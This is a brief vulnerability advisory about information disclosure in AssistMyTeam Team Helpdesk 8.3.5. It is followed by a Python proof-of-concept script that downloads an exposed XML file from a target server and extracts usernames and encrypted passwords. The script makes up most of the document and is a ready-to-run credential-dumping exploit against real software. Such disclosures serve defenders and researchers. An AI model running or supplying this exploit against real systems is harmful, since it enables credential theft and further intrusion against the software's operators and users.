source: http://www.securityfocus.com/bid/67271/info

AssistMyTeam Team Helpdesk is prone to multiple information-disclosure vulnerabilities.

Successfully exploiting these issues may allow an attacker to obtain sensitive information that may aid in further attacks.

Team Helpdesk 8.3.5 is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import sys
import re
import os
import subprocess

print "This is an User Credential Dump for Team Helpdesk Customer Wev Service 8.3.5 (and prior) by bhamb.\n"
print "Send any comment to ccb3b72@gmail.com\n"

if len(sys.argv) != 2:
	print('Usage: user_cred_dump.py https://Hostname.com')
	exit(1)

hostname=sys.argv[1]+"/cws/bin/cwacallers.xml"
print hostname
subprocess.Popen(['wget', '--no-check-certificate',hostname]).communicate()

print "The following usernames and encrypted password were found.\n"
cmd="cat cwacallers.xml | grep '@' | cut -d'\"' -f4,6 | sed 's/\"/:/g' "
test=os.system(cmd)





